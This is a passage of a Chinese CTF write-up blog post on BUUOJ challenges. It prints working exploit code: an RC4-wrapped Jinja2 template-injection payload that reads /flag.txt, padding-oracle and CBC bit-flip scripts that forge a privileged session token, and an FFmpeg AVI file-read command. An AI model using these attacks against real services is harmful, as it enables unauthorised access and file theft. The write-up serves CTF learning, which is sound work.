self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line"> </span><br><span class="line">    def crypt(self, plaintext):</span><br><span class="line">        i = 0</span><br><span class="line">        j = 0</span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:</span><br><span class="line">            i = (i + 1) % 256</span><br><span class="line">            j = (j + self.Box[i]) % 256</span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line">            t = (self.Box[i] + self.Box[j]) % 256</span><br><span class="line">            result += chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        <span class="built_in">return</span> result</span><br><span class="line">url=<span class="string">"http://461be803-a807-4472-8059-a262ee0c43af.node3.buuoj.cn/secret?secret="</span></span><br><span class="line">a = RC4(<span class="string">'HereIsTreasure'</span>)</span><br><span class="line">cmd = <span class="string">"&#123;&#123; [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() &#125;&#125;"</span></span><br><span class="line">payload = urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">res = requests.get(url + payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></p>
+<p>不明白为什么用在线脚本加密出来的payload和脚本加密出来的不一样，而且这里secret值大于四位就会报错<br>脚本加密出来的也是很长一串payload，访问的时候却不报错233 太菜了</p>
+<h2 id="CISCN2019-东北赛区-Day2-Web3-Point-System"><a href="#CISCN2019-东北赛区-Day2-Web3-Point-System" class="headerlink" title="[CISCN2019 东北赛区 Day2 Web3]Point System"></a>[CISCN2019 东北赛区 Day2 Web3]Point System</h2><p>参考wp<a href="https://www.zhaoj.in/read-6119.html" target="_blank" rel="noopener">赵师傅的</a><br>3个考点</p>
+<ol>
+<li>敏感文件泄露（Robots.txt）</li>
+<li>Padding Oracle 明文推断 &amp; CBC 翻转攻击</li>
+<li>FFMpeg 任意文件读取漏洞<br>访问 robots.txt，再访问 swagger_ui.html 获得 API 列表之后通过 API 注册普通用户<br>Content-Type要选application/json<br>登陆提示权限不足，然后看到登陆时的token的key值<br>再用 <a href="https://www.freebuf.com/articles/database/151167.html" target="_blank" rel="noopener">PadOracle</a> 推出 Key 的加密前的原文<br>因为我用赵师傅的py2脚本报错，所以用了其他师傅的脚本py3脚本，附<a href="https://www.cnblogs.com/20175211lyz/p/11636924.html" target="_blank" rel="noopener">原文</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"9f296959-f1ae-4bba-b187-aad6cc511dfc.node3.buuoj.cn"</span></span><br><span class="line">port = 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def padding_oracle(key):</span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    signed_key_decoded = base64.b64decode(signed_key)</span><br><span class="line">    <span class="comment">#print(signed_key_decoded)</span></span><br><span class="line">    url = <span class="string">"http://"</span> + host + <span class="string">":"</span> + str(port) + <span class="string">"/frontend/api/v1/user/info"</span></span><br><span class="line">    <span class="comment">#print(signed_key_decoded)</span></span><br><span class="line">    <span class="comment"># b'ICxkSingDanceRaPY\xac\xad&gt;\xe4h]\xd0[\xfa(_\xb5*N(&amp;\xc8\xc62\xd1\x06&gt;M\xe2\xb7\xdaLEz\x8cd\xfd\x8e\xb2\xde\x19\xbf\x84\x15\xbe\x88\xb8\xae*\xfb\x0c)#\xbeT\xf0\x89\x14\x8e\xce\x96\xb4\xbf\x1aV\xbcU\x98ns;\xf9\xfb\xcb\xf7Z\xb0\x88\x1c\xd4\xa6D\xd2\xa5\x00^\x03\xbd\x1e\xa5\xd1\x19Tf=3g\xcd\xd7\x88'</span></span><br><span class="line">    <span class="comment"># print(len(signed_key_decoded))</span></span><br><span class="line">    <span class="comment"># 112/16=7</span></span><br><span class="line">    N = 16</span><br><span class="line"></span><br><span class="line">    total_plain = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> range(0, len(signed_key_decoded) // 16 - 1):</span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        get = b<span class="string">""</span></span><br><span class="line">        cipher = signed_key_decoded[16 + block * 16:32 + block * 16]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(1, N+1):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(0, 256):</span><br><span class="line">                time.sleep(0.15) </span><br><span class="line">                padding = b<span class="string">""</span>.join([(get[n] ^ i).to_bytes(1, <span class="string">'little'</span>) <span class="keyword">for</span> n <span class="keyword">in</span> range(len(get))])</span><br><span class="line">                c = b<span class="string">'\x00'</span> * (16 - i) + j.to_bytes(1, <span class="string">'little'</span>) + padding + cipher</span><br><span class="line">                token = base64.b64encode(c)</span><br><span class="line">                user_key_json_decode[<span class="string">'signed_key'</span>] = token.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">                header = &#123;<span class="string">'Key'</span>: base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">"utf-8"</span>))&#125;</span><br><span class="line">                res = requests.get(url, headers=header)</span><br><span class="line">                <span class="keyword">if</span> res.json()[<span class="string">'code'</span>] != 205:</span><br><span class="line">                    get = (j ^ i).to_bytes(1, <span class="string">'little'</span>) + get</span><br><span class="line">                    <span class="built_in">print</span>(get, i)</span><br><span class="line">                    <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">        plain = b<span class="string">""</span>.join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, <span class="string">'little'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)])</span><br><span class="line">        <span class="built_in">print</span>(plain.decode(<span class="string">"utf-8"</span>), <span class="string">"block=%d"</span> % block)</span><br><span class="line">        total_plain += plain.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        <span class="built_in">print</span>(total_plain)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> total_plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plain_text = padding_oracle(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWnlXM2EyRll3OHFaZ0tvaEExVHJZdmFGSVRGOGlWWlBFYldjWm5FcEJzYi9NWWlmNXRHMWVwV01kZ3JhbUgyRDNqTGFodnZqRVBucVF4VGNXRnZ5ajJnPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoidVppNFBWY09Sb2xPam94aUpzV1FyY2RPQnZCZFNxR0kiLCJleHBpcmVfaW4iOjE1ODE0MTc0MzJ9"</span>)</span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>signed_key解密结果是{“role”:3,”user_id”:1,”payload”:”uZi4PVcORolOjoxiJsWQrcdOBvBdSqGI”,”expire_in”:1581417432}末尾还有几个\x05<br>再用 <a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">CBC翻转攻击</a>变更角色，提升系统内权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"9f296959-f1ae-4bba-b187-aad6cc511dfc.node3.buuoj.cn"</span></span><br><span class="line">port = 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cbc_attack(key, block, origin_content, target_content):</span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    <span class="comment">#print(user_key_decode)</span></span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    <span class="comment">#print(signed_key)</span></span><br><span class="line">    cipher_o = base64.b64decode(signed_key)</span><br><span class="line">    <span class="comment">#print(cipher_o)</span></span><br><span class="line">    <span class="keyword">if</span> block &gt; 0:</span><br><span class="line">        iv_prefix = cipher_o[:block * 16]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        iv_prefix = b<span class="string">''</span></span><br><span class="line">    iv = cipher_o[block * 16:16 + block * 16]</span><br><span class="line">    cipher = cipher_o[16 + block * 16:]</span><br><span class="line">    iv_array = bytearray(iv)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, 16):</span><br><span class="line">        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])</span><br><span class="line">    iv = bytes(iv_array)</span><br><span class="line">    <span class="comment">#print(iv)</span></span><br><span class="line">    user_key_json_decode[<span class="string">'signed_key'</span>] = base64.b64encode(iv_prefix + iv + cipher).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="built_in">return</span> base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_user_info(key):</span><br><span class="line">    r = requests.post(<span class="string">"http://"</span> + host + <span class="string">":"</span> + str(port) + <span class="string">"/frontend/api/v1/user/info"</span>, headers=&#123;<span class="string">"Key"</span>: key&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == 100:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"获取成功！"</span>)</span><br><span class="line">    <span class="built_in">return</span> r.json()[<span class="string">'data'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def modify_role_plain(key, role):</span><br><span class="line">    user_key_decode = base64.b64decode(user_key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    user_key_json_decode[<span class="string">'role'</span>] = role</span><br><span class="line">    <span class="built_in">return</span> base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_key = cbc_attack(</span><br><span class="line">    <span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWnlXM2EyRll3OHFaZ0tvaEExVHJZdmFGSVRGOGlWWlBFYldjWm5FcEJzYi9NWWlmNXRHMWVwV01kZ3JhbUgyRDNqTGFodnZqRVBucVF4VGNXRnZ5ajJnPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoidVppNFBWY09Sb2xPam94aUpzV1FyY2RPQnZCZFNxR0kiLCJleHBpcmVfaW4iOjE1ODE0MTc0MzJ9"</span>, 0, <span class="string">'&#123;"role":3,"user_'</span>, <span class="string">'&#123;"role":1,"user_'</span>)</span><br><span class="line">user_key = modify_role_plain(user_key, 1)</span><br><span class="line"><span class="built_in">print</span>(user_key)</span><br></pre></td></tr></table></figure></p>
+<p>添加cookie 在console控制台 document.cookie=”key=value”<br>再上传构造过的 AVI 文件来触发 FFMpeg 漏洞读取 flag.<br><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py" target="_blank" rel="noopener">git链接</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gen_xbin_avi.py file:///flag test.avi</span><br></pre></td></tr></table></figure></p>
+<p>上传之后再下载 flag在第一帧<br><img src="https://uploader.shimo.im/f/5VYuwiJu8f4TOCru.png!thumbnail" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/03/2020HGAME/" rel="next" title="2020HGAME">
+                <i class="fa fa-chevron-left"></i> 2020HGAME
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/11/2019bytectfs刷题记录/" rel="prev" title="2019bytectfs刷题记录">
+                2019bytectfs刷题记录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cop</p>
+              <p class="site-description motion-element" itemprop="description">cop's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Laravel1"><span class="nav-number">1.</span> <span class="nav-text">Laravel1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CyberPunk"><span class="nav-number">2.</span> <span class="nav-text">CyberPunk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东北赛区-Web2"><span class="nav-number">3.</span> <span class="nav-text">[CISCN2019 华东北赛区]Web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Web11"><span class="nav-number">4.</span> <span class="nav-text">[CISCN2019 华东南赛区]Web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Web4"><span class="nav-number">5.</span> <span class="nav-text">[CISCN2019 华东南赛区]Web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Double-Secret"><span class="nav-number">6.</span> <span class="nav-text">[CISCN2019 华东南赛区]Double Secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-东北赛区-Day2-Web3-Point-System"><span class="nav-number">7.</span> <span class="nav-text">[CISCN2019 东北赛区 Day2 Web3]Point System</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cop</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body>
+</html>
